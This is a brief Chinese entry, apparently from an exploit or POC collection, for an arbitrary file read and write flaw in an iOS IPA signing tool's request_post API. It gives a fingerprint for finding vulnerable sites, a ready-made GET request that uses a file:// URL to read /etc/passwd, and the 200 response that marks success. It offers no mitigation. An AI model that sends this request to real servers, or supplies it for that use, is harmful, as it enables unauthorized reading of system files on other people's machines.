# 苹果IOS端IPA签名工具request_post任意文件读取漏洞

苹果IOS端IPA签名工具request_post ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/assets/index/css/mobileSelect.css"`
- **请求**：`GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1`
- **响应特征**：200